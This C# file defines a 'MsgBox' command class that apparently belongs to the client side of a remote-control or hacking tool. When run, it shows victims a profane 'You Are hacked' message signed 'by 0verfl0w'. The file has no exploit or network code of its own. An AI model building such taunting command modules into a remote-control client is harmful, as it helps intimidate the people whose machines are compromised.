using System.Windows.Forms;
namespace Client.Commands
{
    public class MsgBox : Command
    {
        public MsgBox(string name) : base(name) { }

        public override string execute(string[] args)
        {
            if (args.Length == 0)
            {
                MessageBox.Show("You Are hacked you sick Son of a bitch :)", "by 0verfl0w");

                return "";
            }

            else
            {
                return "Invalid argumnets For MessageBox Requeries Zero. ";
            }
        }
    }
}
